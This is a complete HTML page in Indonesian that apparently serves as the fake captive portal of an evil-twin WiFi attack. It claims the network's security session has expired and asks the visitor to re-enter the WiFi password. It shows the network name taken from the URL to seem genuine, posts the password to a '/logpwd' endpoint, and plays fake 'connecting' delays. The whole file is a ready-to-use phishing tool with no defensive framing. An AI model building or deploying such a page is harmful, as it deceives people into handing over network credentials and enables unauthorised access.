<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Konfirmasi WiFi</title>
    <style>
        * { box-sizing: border-box; }
        body { 
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; 
            margin: 0; 
            padding: 0; 
            display: flex; 
            justify-content: center; 
            align-items: center; 
            min-height: 100vh; 
        }
        
        .card {
            background: white;
            border-radius: 20px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            width: 90%;
            max-width: 380px;
            padding: 30px;
            text-align: center;
        }
        
        .logo {
            width: 80px;
            height: 80px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 20px;
            font-size: 40px;
        }
        
        h1 {
            color: #333;
            font-size: 22px;
            margin-bottom: 10px;
        }
        
        .wifi-info {
            background: #f8f9fa;
            padding: 15px;
            border-radius: 10px;
            margin-bottom: 25px;
        }
        
        .wifi-name {
            font-size: 18px;
            font-weight: bold;
            color: #333;
            margin-bottom: 5px;
        }
        
        .wifi-status {
            font-size: 12px;
            color: #dc3545;
        }
        
        .input-group {
            text-align: left;
            margin-bottom: 20px;
        }
        
        .input-group label {
            display: block;
            font-size: 12px;
            color: #666;
            margin-bottom: 8px;
            font-weight: 600;
        }
        
        .input-group input {
            width: 100%;
            padding: 15px;
            border: 2px solid #e0e0e0;
            border-radius: 10px;
            font-size: 16px;
            transition: border-color 0.3s;
        }
        
        .input-group input:focus {
            outline: none;
            border-color: #667eea;
        }
        
        .btn {
            width: 100%;
            padding: 15px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            border-radius: 10px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            transition: transform 0.2s;
        }
        
        .btn:hover {
            transform: scale(1.02);
        }
        
        .btn:active {
            transform: scale(0.98);
        }
        
        .warning {
            margin-top: 20px;
            font-size: 11px;
            color: #999;
        }
        
        .loading {
            display: none;
            margin-top: 15px;
            font-size: 14px;
            color: #667eea;
        }
    </style>
</head>
<body>

<div class="card">
    <div class="logo">📶</div>
    <h1>Verifikasi Jaringan WiFi</h1>
    
    <div class="wifi-info">
        <div class="wifi-name" id="wifiName">Memuat...</div>
        <div class="wifi-status">⚠️ Sesi keamanan berakhir</div>
    </div>
    
    <form action="/logpwd" method="POST" id="loginForm">
        <div class="input-group">
            <label>Kata Sandi WiFi</label>
            <input type="password" name="pwd" id="password" placeholder="Masukkan kata sandi" required>
        </div>
        
        <button type="submit" class="btn" id="btnConnect">Sambungkan Ulang</button>
        
        <div class="loading" id="loading">
            <span>⏳ Menyambungkan...</span>
        </div>
    </form>
    
    <div class="warning">
        Dengan melanjutkan, Anda menyetujui ketentuan penggunaan jaringan
    </div>
</div>

<script>
    const form = document.getElementById('loginForm');
    const btn = document.getElementById('btnConnect');
    const loading = document.getElementById('loading');
    const wifiName = document.getElementById('wifiName');
    
    // Get WiFi name from URL or set default
    const urlParams = new URLSearchParams(window.location.search);
    const ssid = urlParams.get('ssid') || 'Jaringan WiFi';
    wifiName.textContent = ssid;
    
    form.addEventListener('submit', function(e) {
        e.preventDefault();
        btn.textContent = 'Memproses...';
        btn.disabled = true;
        loading.style.display = 'block';
        
        setTimeout(() => {
            btn.textContent = 'Menyambungkan...';
            
            setTimeout(() => {
                form.submit();
            }, 1500);
        }, 1000);
    });
</script>

</body>
</html>
